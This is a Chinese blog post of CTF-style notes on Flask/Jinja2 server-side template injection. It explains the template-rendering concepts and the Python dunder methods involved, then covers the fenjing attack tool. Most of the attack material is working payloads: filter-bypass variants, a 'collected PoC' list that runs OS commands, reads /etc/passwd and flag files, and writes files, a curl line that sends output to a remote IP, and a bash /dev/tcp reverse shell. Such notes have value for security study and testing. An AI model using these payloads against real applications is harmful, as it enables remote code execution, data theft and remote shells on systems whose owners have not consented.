# SSTI-Flask模板注入


# Flask之SSTI模版注入

参考博客：[flask之ssti模版注入从零到入门]([flask之ssti模版注入从零到入门 - 先知社区](https://xz.aliyun.com/t/3679?time__1311=n4%2Bxnii%3DoGqmqDK0QDODlx6e0%3DWyK0KA%3DoK4iK%3Dx))

## SSTI漏洞框架

- Python
  - Jinja2
  - mako
  - tornado
  - django
- PHP
  - smarty
  - twig
- Java
  - jade
  - velocity

## SSTI漏洞成因

**使用了渲染函数时**，由于代码**不规范或信任了用户输入**而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。

## 模板引擎

模板引擎可以让（网站）程序实现**界面与数据分离**，**业务代码与逻辑代码的分离**，这大大提升了开发效率，良好的设计也使得代码重用变得更加容易。

虽然模板引擎会提供沙箱机制，但同样存在沙箱逃逸技术来绕过。

模板是用于从数据（变量）到实际的视觉表现（HTML代码）

实际：拿到数据，塞到模板里，然后让渲染引擎将赛进去的东西生成 html 的文本，返回给浏览器，这样做的好处展示数据快，大大提升效率。

渲染主要分为：前端渲染和后端渲染。

- 后端渲染

  服务器计算，给用户呈现HEML字符串。前端只需要显示

- 前端渲染

  浏览器从后端服务器得到信息，语言可能是json等数据包封装，也可能是html代码。但是需要浏览器前端来解析渲染成html代码呈现。

## 服务模板注入

模板就是通过输入转换成特定的HTML文件，如一些博客页面，登录时候返回`hi,xxx`。

而这个`xxx`就是通过身份信息渲染成的html返回页面。

例如：

```
$output = $twig-&gt;render( $_GET[&#39;custom_email&#39;] , array(&#34;first_name&#34; =&gt; $user.first_name) );
```

本身就有xss漏洞，如果用`custom_emai`直接写`&lt;img&gt;alert(&#34;xss&#34;)&lt;/img&gt;`

但是由于本身的不规范，还有这更严重的ssti漏洞

如果`url:xxxx/?custom_emai={{7*7}}`，会返回49的计算值

在`{{}}`里，他将我们的代码进行了执行。服务器将我们的数据经过引擎解析的时候，进行了执行，模板注入与sql注入成因有点相似，都是信任了用户的输入，将不可靠的用户输入不经过滤直接进行了执行，用户插入了恶意代码同样也会执行。

### flask 框架的实例代码

```
from flask import Flask

app = Flask(__name__)

@app.route(&#39;/&#39;)
def hello_world():
    return &#34;Hello World&#34;

if __name__ == &#39;__main__&#39;:
    app.run()
```

### route装饰器路由

```
@app.route(&#39;/&#39;)
```

选择url的定位

`/` 表示网页根目录

`/test`就需要用127.0.0.1:5000/test进入

如果设置动态网址可以写为

```
@app.route(&#34;/hello/&lt;username&gt;&#34;)
def hello_user(username):
  return &#34;user:%s&#34;%username
```

### main入口

```
app.debug = True
app.run(debug=True)
```

加上debug就可以直接改代码后直接刷新进行显示保存的修改代码，不用重运行

## 模板渲染！！！

###   模板渲染体系

`render_template`函数渲染的是`templates`中的模板

```
├── app.py  
├── static  
│   └── style.css  
└── templates  
    └── index.html
```

例如index.html里面有

```
&lt;html&gt;
  &lt;head&gt;
    &lt;title&gt;{{title}} - 小猪佩奇&lt;/title&gt;
  &lt;/head&gt;
 &lt;body&gt;
      &lt;h1&gt;Hello, {{user.name}}!&lt;/h1&gt;
  &lt;/body&gt;
&lt;/html&gt;
```

其中`title`和`user.name`

### flask-SSTI

关键代码：用于渲染

```
render_template()
```

&gt; 以下是无过滤情况的过程

查找类

```
&#34;&#34;.__class__	# str
```


查找基类

```
&#34;&#34;.__class__.__bases__	# object
&#34;&#34;.__class__.__mro__
```

查这个类的子类的集合

```
&#34;&#34;.__class__.__bases__[0].__subclasses__()	
# [&lt;class &#39;type&#39;&gt;, &lt;class &#39;weakref&#39;&gt;, &lt;class &#39;weakcallableproxy&#39;&gt;, &lt;class &#39;weakproxy&#39;&gt;, &lt;class...
```

找到合适的类，然后从合适的类中寻找我们需要的方法

`&lt;class &#39;os._wrap_close&#39;&gt;`，os命令相信你看到就感觉很亲切

## 绕过tips

### 关键字过滤

* 字符串拼接

  ```
  {{&#39;&#39;[&#39;__cl&#39;&#43;&#39;ass__&#39;].__bases__[0][&#39;__subcl&#39;&#43;&#39;asses__&#39;]()}}
  ```

* 单双引号绕过

  ```
  ?name={{&#39;&#39;[&#39;__class__&#39;].__mro__[1].__subclasses__()[139].__init__.__globals__[&#39;__bui&#39;&#39;ltins__&#39;][&#39;__impo&#39;&#39;rt__&#39;](&#39;o&#39;&#39;s&#39;).popen(&#39;who&#39;&#39;ami&#39;).read()}}
  ```

* 编码绕过

  * base64

    python2下使用，python3没有decode方法

    ```
    ?name={{&#39;&#39;.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__[&#39;__builtins__&#39;][&#39;X19pbXBvcnRfXw==&#39;.decode(&#39;base64&#39;)](&#39;os&#39;).popen(&#39;whoami&#39;).read()}}
    ```

  * Unicode编码绕过

    ```
    ?name={{&#39;&#39;.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__[&#39;__builtins__&#39;][&#39;\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f&#39;](&#39;os&#39;).popen(&#39;whoami&#39;).read()}}
    ```

  * 16进制编码绕过

    ```
    name={{&#39;&#39;.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__[&#39;__builtins__&#39;][&#39;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f&#39;](&#39;os&#39;).popen(&#39;whoami&#39;).read()}}
    ```

  * 8进制编码绕过

    ```
    ?name={{&#39;&#39;[&#39;\137\137\143\154\141\163\163\137\137&#39;].__mro__[1].__subclasses__()[139].__init__.__globals__[&#39;__builtins__&#39;][&#39;\137\137\151\155\160\157\162\164\137\137&#39;](&#39;os&#39;).popen(&#39;whoami&#39;).read()}}
    ```

### 过滤[]括号

* 使用gititem绕过

使用getitem()方法输出序列属性中某个索引处的元素，相当于[]

```
?name={{&#39;&#39;.__class__.__mro__[1].__subclasses__().__getitem__(139).__init__.__globals__.__getitem__(&#39;__builtins__&#39;).__getitem__(&#39;__import__&#39;)(&#39;os&#39;).popen(&#39;whoami&#39;).read()}}
```

* 点绕过

  访问字典里的值有两种方法，一种是把相应的键放入方括号[]里来访问，一种就是用点.来访问。当方括号[]被过滤之后，还可以用点.的方式来访问

  ```
  ?name={{&#39;&#39;.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()}}
  ```

### 过滤引号

* request对象绕过

  request有两种形式，request.args和request.values，POST和GET传递的数据都可以被接收

  ```
  ?name={{&#39;&#39;.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__.__builtins__.__import__(request.args.v1).popen(request.values.v2).read()}}&amp;v1=os&amp;v2=whoami
  ```

* chr绕过

  GET请求时，&#43;号记得url编码，要不会被当作空格处理。

  ```
  ?name={% set chr=().__class__.__mro__[1].__subclasses__()[139].__init__.__globals__.__builtins__.chr%}{{&#39;&#39;.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__.__builtins__.__import__(chr(111)%2Bchr(115)).popen(chr(119)%2Bchr(104)%2Bchr(111)%2Bchr(97)%2Bchr(109)%2Bchr(105)).read()}}
  ```

### 过滤点

* 中括号[]绕过

  ```
  ?name={{&#39;&#39;[&#39;__class__&#39;][&#39;__mro__&#39;][1][&#39;__subclasses__&#39;]()[139][&#39;__init__&#39;][&#39;__globals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&#34;os&#34;).popen(&#34;whoami&#34;).read()&#39;)}}
  ```

* |attr()绕过

  ttr()为jinja2原生函数，是一个过滤器，它只查找属性获取并返回对象的属性的值，过滤器与变量用管道符号（ | ）分割.

  ```
  ?name={{()|attr(&#39;__class__&#39;)|attr(&#39;__base__&#39;)|attr(&#39;__subclasses__&#39;)()|attr(&#39;__getitem__&#39;)(139)|attr(&#39;__init__&#39;)|attr(&#39;__globals__&#39;)|attr(&#39;__getitem__&#39;)(&#39;__builtins__&#39;)|attr(&#39;__getitem__&#39;)(&#39;eval&#39;)(&#39;__import__(&#34;os&#34;).popen(&#34;whoami&#34;).read()&#39;)}}
  ```

### 过滤_

*  request对象绕过

  ```
  ?name={{&#39;&#39;[request.args.v1][request.args.v2][1][request.args.v3]()[139][request.args.v4][request.args.v5][request.args.v6][request.args.v7](request.args.v8)}}&amp;v1=__class__&amp;v2=__mro__&amp;v3=__subclasses__&amp;v4=__init__&amp;v5=__globals__&amp;v6=__builtins__&amp;v7=eval&amp;v8=__import__(&#34;os&#34;).popen(&#34;whoami&#34;).read()
  ```

### 过滤{{

* {% if ... %}1{% endif %}

  使用 {% if ... %}1{% endif %} 配合 os.popen 和 curl 将执行结果外带出来，不外带的话执行结果无回显

  ```
  {% if &#39;&#39;.__class__.__base__.__subclasses__()[139].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&#34;os&#34;).popen(&#34;curl http://xxx.xxx.xxx.xxx:12345/?i=`whoami`&#34;).read()&#39;) %}1{% endif %}
  ```

* {%print(......)%}

  ```
  {% print(&#39;&#39;.__class__.__base__.__subclasses__()[139].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&#34;os&#34;).popen(&#34;ls&#34;).read()&#39;)) %}
  ```

### 过滤subclasses

拼凑法

```
{{&#34;&#34;.class.bases[0].subclasses()}}	# 原
{{&#34;&#34;.class.bases[0]&#39;subcla&#39;&#43;&#39;sses&#39;}}	# 后
```

### 过滤class

使用session

```
{{session[&#39;cla&#39;&#43;&#39;ss&#39;].bases[0].bases[0].bases[0].bases[0].subclasses()[118]}}	# 原

```

多个bases[0]是因为一直在向上找object类。使用mro就会很方便

```
{{session[&#39;__cla&#39;&#43;&#39;ss__&#39;].__mro__[12]}}
request[&#39;__cl&#39;&#43;&#39;ass__&#39;].__mro__[12]}}
```

### timeit姿势

&gt; 例题：2017 swpu-ctf

```
import timeit
timeit.timeit(&#34;__import__(&#39;os&#39;).system(&#39;dir&#39;)&#34;,number=1)

import platform
print platform.popen(&#39;dir&#39;).read()
```

## 收藏版poc

```
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;](&#39;__import__(&#34;os&#34;).popen(&#34;ls  /var/www/html&#34;).read()&#39; )
```

```
object.__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].__dict__[&#39;o&#39;&#43;&#39;s&#39;].__dict__[&#39;sy&#39;&#43;&#39;stem&#39;](&#39;ls&#39;)
```

```
{{request[&#39;__cl&#39;&#43;&#39;ass__&#39;].__base__.__base__.__base__[&#39;__subcla&#39;&#43;&#39;sses__&#39;]()[60][&#39;__in&#39;&#43;&#39;it__&#39;][&#39;__&#39;&#43;&#39;glo&#39;&#43;&#39;bal&#39;&#43;&#39;s__&#39;][&#39;__bu&#39;&#43;&#39;iltins__&#39;][&#39;ev&#39;&#43;&#39;al&#39;](&#39;__im&#39;&#43;&#39;port__(&#34;os&#34;).po&#39;&#43;&#39;pen(&#34;ca&#34;&#43;&#34;t a.php&#34;).re&#39;&#43;&#39;ad()&#39;)}}
```

```
# 读文件
#读取文件类，&lt;type ‘file’&gt; file位置一般为40，直接调用
{{[].__class__.__base__.__subclasses__()[40](&#39;flag&#39;).read()}} 
{{[].__class__.__bases__[0].__subclasses__()[40](&#39;etc/passwd&#39;).read()}}
{{[].__class__.__bases__[0].__subclasses__()[40](&#39;etc/passwd&#39;).readlines()}}
{{[].__class__.__base__.__subclasses__()[257](&#39;flag&#39;).read()}} (python3)


#直接使用popen命令，python2是非法的，只限于python3
os._wrap_close 类里有popen
{{&#34;&#34;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__[&#39;popen&#39;](&#39;whoami&#39;).read()}}
{{&#34;&#34;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__.popen(&#39;whoami&#39;).read()}}


#调用os的popen执行命令
#python2、python3通用
{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()}}
{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;ls /flag&#39;).read()}}
{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;cat /flag&#39;).read()}}
{{&#39;&#39;.__class__.__base__.__subclasses__()[185].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).popen(&#39;cat /flag&#39;).read()}}
{{&#34;&#34;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read()}}
{{&#34;&#34;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).popen(&#39;id&#39;).read()}}
{{&#34;&#34;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__[&#39;os&#39;].popen(&#39;whoami&#39;).read()}}
#python3专属
{{&#34;&#34;.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()}}
{{&#39;&#39;.__class__.__base__.__subclasses__()[128].__init__.__globals__[&#39;os&#39;].popen(&#39;ls /&#39;).read()}}


#调用eval函数读取
#python2
{{[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#34;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&#34;)}} 
{{&#34;&#34;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&#34;os&#34;).system(&#34;ls&#34;)&#39;)}}
{{&#34;&#34;.__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&#34;os&#34;).system(&#34;ls&#34;)&#39;)}}
{{&#34;&#34;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval,&#39;os.system(&#34;ls&#34;)&#39;)}}
#python3
{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;eval&#39;](&#34;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&#34;)}} 
{{&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;]}}
{{&#34;&#34;.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;]}}
{{&#34;&#34;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#34;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&#34;)}}
{{&#34;&#34;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.eval(&#34;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&#34;)}}
{{&#39;&#39;.__class__.__base__.__subclasses__()[128].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&#34;os&#34;).popen(&#34;ls /&#34;).read()&#39;)}}


#调用 importlib类
{{&#39;&#39;.__class__.__base__.__subclasses__()[128][&#34;load_module&#34;](&#34;os&#34;)[&#34;popen&#34;](&#34;ls /&#34;).read()}}


#调用linecache函数
{{&#39;&#39;.__class__.__base__.__subclasses__()[128].__init__.__globals__[&#39;linecache&#39;][&#39;os&#39;].popen(&#39;ls /&#39;).read()}}
{{[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;][&#39;os&#39;].popen(&#39;ls&#39;).read()}}
{{[].__class__.__base__.__subclasses__()[168].__init__.__globals__.linecache.os.popen(&#39;ls /&#39;).read()}}


#调用communicate()函数
{{&#39;&#39;.__class__.__base__.__subclasses__()[128](&#39;whoami&#39;,shell=True,stdout=-1).communicate()[0].strip()}}


#写文件
写文件的话就直接把上面的构造里的read()换成write()即可，下面举例利用file类将数据写入文件。
{{&#34;&#34;.__class__.__bases__[0].__bases__[0].__subclasses__()[40](&#39;/tmp&#39;).write(&#39;test&#39;)}}  ----python2的str类型不直接从属于属于基类，所以要两次 .__bases__
{{&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;/etc/passwd&#39;).write(&#39;123456&#39;)}}


#通用 getshell
原理就是找到含有 __builtins__ 的类，然后利用。
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==&#39;catch_warnings&#39; %}{{ c.__init__.__globals__[&#39;__builtins__&#39;].eval(&#34;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&#34;) }}{% endif %}{% endfor %}
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==&#39;catch_warnings&#39; %}{{ c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;filename&#39;, &#39;r&#39;).read() }}{% endif %}{% endfor %}

```

```
# request.cookie
{{self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&#34;/flag&#34;).read()}}

{{self[request.cookies.di][request.cookies.temp][request.cookies.lip][request.cookies.glo][request.cookies.bui].open(request.cookies.cmd).read()}}
 
cookie:di=__dict__;temp=_TemplateReference__context;lip=lipsum;glo=__globals__;bui=__builtins__;cmd=flag
```

```
&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;/etc/passwd&#39;).read()

()..__class__.__bases__[0].__subclasses__()[40](&#39;/etc/passwd&#39;).read()
object.__subclasses__()[40](&#39;/etc/passwd&#39;).read()

&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;/tmp/evil.txt&#39;, &#39;w&#39;).write(&#39;evil code&#39;)
().__class__.__bases__[0].__subclasses__()[40](&#39;/tmp/evil.txt&#39;, &#39;w&#39;).write(&#39;evil code&#39;)
object.__subclasses__()[40](&#39;/tmp/evil.txt&#39;, &#39;w&#39;).write(&#39;evil code&#39;)

&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)
&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()

# eval
&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#34;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&#34;)
&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.__builtins__.eval(&#34;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&#34;)
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;](&#39;__import__(&#34;os&#34;).popen(&#34;ls  /var/www/html&#34;).read()&#39; )
object.__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;](&#39;__import__(&#34;os&#34;).popen(&#34;ls  /var/www/html&#34;).read()&#39; )

#__import__
&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read()
&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).popen(&#39;id&#39;).read()

&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;bash -i &gt;&amp; /dev/tcp/你的服务器地址/端口 0&gt;&amp;1&#39;).read()
```



## 魔术方法

### `__class__`

用来查看变量所属的类，根据前面的变量形式可以得到其所属的类。

```
&gt;&gt;&gt; &#39;&#39;.__class__
&lt;type &#39;str&#39;&gt;
&gt;&gt;&gt; ().__class__
&lt;type &#39;tuple&#39;&gt;
&gt;&gt;&gt; [].__class__
&lt;type &#39;list&#39;&gt;
&gt;&gt;&gt; {}.__class__
&lt;type &#39;dict&#39;&gt;
```

### `__bases__`

用来查看类的基类，也可是使用数组索引来查看特定位置的值

```
&gt;&gt;&gt; ().__class__.__bases__
(&lt;type &#39;object&#39;&gt;,)
&gt;&gt;&gt; &#39;&#39;.__class__.__bases__
(&lt;type &#39;basestring&#39;&gt;,)
&gt;&gt;&gt; [].__class__.__bases__
(&lt;type &#39;object&#39;&gt;,)
&gt;&gt;&gt; {}.__class__.__bases__
(&lt;type &#39;object&#39;&gt;,)
&gt;&gt;&gt; [].__class__.__bases__[0]
&lt;type &#39;object&#39;&gt;
```

### `__mro__`

也可以获取基类

```
&gt;&gt;&gt; &#39;&#39;.__class__.__mro__
(&lt;class &#39;str&#39;&gt;, &lt;class &#39;object&#39;&gt;)
&gt;&gt;&gt; [].__class__.__mro__
(&lt;class &#39;list&#39;&gt;, &lt;class &#39;object&#39;&gt;)
&gt;&gt;&gt; {}.__class__.__mro__
(&lt;class &#39;dict&#39;&gt;, &lt;class &#39;object&#39;&gt;)
&gt;&gt;&gt; ().__class__.__mro__
(&lt;class &#39;tuple&#39;&gt;, &lt;class &#39;object&#39;&gt;)
&gt;&gt;&gt; ().__class__.__mro__[1]            # 使用索引就能获取基类了
&lt;class &#39;object&#39;&gt;
```

### `__subclasses__`

每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表

### `__init__`

类的初始化方法

### `__globals__`

对包含函数全局变量的字典的引用

### `__getattribute__`

当类被调用的时候，无条件进入此函数

### `__getattr__`

对象中不存在的属性时调用

### `__dict__`

返回所有属性，包括属性，方法等

### `__builtins__`

作为默认初始模块出现的，可用于查看当前所有导入的内建函数

## 常用模块

* os._wrap_close

  ```
  .__init__.__globals__[&#39;pop&#39;&#43;&#39;en&#39;](&#39;cat /flag&#39;).read()
  ```

  

## 基础思路

- 获取object类

  python的object类中集成了很多的基础函数，我们想要调用的时候也是需要用object去操作的，主要是通过mro 和 bases两种方式来创建。

  mro 属性获取类的MRO(方法解析顺序)，也就是继承关系。

  ```
  ().__class__.__bases__[0]
  
  {}.__class__.__bases__[0]
  
  [].__class__.__bases__[0]
  
  &#39;&#39;.__class__.__bases__[0] #python3
  ```

  __bases__  属性可以获取上一层的继承关系，如果是多层继承则返回上一层的东西，可能有多个。

  ```
  ().__class__.__mro__[1]
  
  {}.__class__.__mro__[1]
  
  [].__class__.__mro__[1]
  
  &#39;&#39;.__class__.__mro__[1]#python3
  
  &#39;&#39;.__class__.__mro__[2]#python2
  ```

- 获取子类列表

  然后通过object类的__subclasses__()方法获取所有的子类列表，查看可用的类

  ```
  ().__class__.__bases__[0].__subclasses__()
  ```

  ```
  {{&#39;&#39;[&#39;__cl&#39;&#43;&#39;ass__&#39;].__bases__[0][&#39;__subcl&#39;&#43;&#39;asses__&#39;]()}}
  ```

  若类中有file，考虑读写操作. (python2)

  ```
  [].__class__.__mro__[1].__subclasses__()[40](&#39;/etc/passwd&#39;).read()
  
  [].__class__.__mro__[1].__subclasses__()[40](&#39;/tmp/test.txt&#39;, &#39;w&#39;).write(&#39;xxx’)
  ```

  (2)找到重载过的__init__类。

  在获取初始化属性后，带wrapper的说明没有重载，寻找不带warpper的，因为wrapper是指这些函数并没有被重载，这时它们并不是function，不具有__globals__属性。

  用脚本帮我们来筛选出重载过的init类的类

  ```
  l = len([].__class__.__mro__[1].__subclasses__())
  for i in range(l):
      if &#39;wrapper&#39; not in str([].__class__.__mro__[1].__subclasses__()[i].__init__):
          print(i,[].__class__.__mro__[1].__subclasses__()[i])
  ```

  重载过的__init__类的类具有__globals__属性，这里以WarningMessage为例，会返回很多dict类型。

  ```
  [].__class__.__mro__[1].__subclasses__()[58].__init__.__globals__
  ```

  寻找keys中的__builtins__来查看引用，这里同样会返回很多dict类型

  ```
  [].__class__.__mro__[1].__subclasses__()[58].__init__.__globals__[&#39;__builtins__&#39;]
  ```

  相关利用:

  - builtins利用

    ```
    [].__class__.__mro__[1].__subclasses__()[58].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;/etc/passwd&#39;).read()
    
    
    
    [].__class__.__mro__[1].__subclasses__()[58].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&#34;os&#34;).popen(&#34;ls&#34;).read()
    ```

  - linecache利用

    ```
    [].__class__.__mro__[1].__subclasses__()[58].__init__.__globals__[&#39;linecache&#39;].__dict__[&#39;os&#39;].system(&#39;whoami’)
    
    [].__class__.__mro__[1].__subclasses__()[58].__init__.__globals__[&#39;linecache&#39;].__dict__[&#39;sys&#39;].modules[&#39;os&#39;].system(&#39;whoami’)
    
    [].__class__.__mro__[1].__subclasses__()[58].__init__.__globals__[&#39;linecache&#39;].__dict__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).system(&#39;ls’)
    ```

  - sys利用

    ```
    [].__class__.__mro__[1].__subclasses__()[58].__init__.__globals__[&#39;sys&#39;].modules[&#39;os&#39;].system(&#39;whoami&#39;)
    ```

## fenjing

```
$ python -m fenjing --help
Usage: python -m fenjing [OPTIONS] COMMAND [ARGS]...

Options:
  --help  Show this message and exit.

Commands:
  crack  攻击指定的表单
  scan   扫描指定的网站
$ python -m fenjing crack --help
Usage: python -m fenjing crack [OPTIONS]

  攻击指定的表单

Options:
  -u, --url TEXT       form所在的URL
  -a, --action TEXT    form的action，默认为当前路径
  -m, --method TEXT    form的提交方式，默认为POST
  -i, --inputs TEXT    form的参数，以逗号分隔
  -e, --exec-cmd TEXT  成功后执行的shell指令，不填则成功后进入交互模式
  --interval FLOAT     每次请求的间隔
  --user-agent TEXT    请求时使用的User Agent
  --help               Show this message and exit.
$ python -m fenjing scan --help
Usage: python -m fenjing scan [OPTIONS]

  扫描指定的网站

Options:
  -u, --url TEXT       需要扫描的URL
  -e, --exec-cmd TEXT  成功后执行的shell指令，不填则进入交互模式
  --interval FLOAT     每次请求的间隔
  --user-agent TEXT    请求时使用的User Agent
  --help               Show this message and exit.
```

### crack-request

还可以将HTTP请求写进一个文本文件里（比如说`req.txt`）然后进行攻击

文本文件内容如下：

```
GET /?name=PAYLOAD HTTP/1.1
Host: 127.0.0.1:5000
Connection: close
```

命令如下：

```
python -m fenjing crack-request -f req.txt --host &#39;127.0.0.1&#39; --port 5000
```


---

> Author: [Ting](Tin10g.github.io)  
> URL: http://localhost:1313/posts/2024web-ssti-flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/  

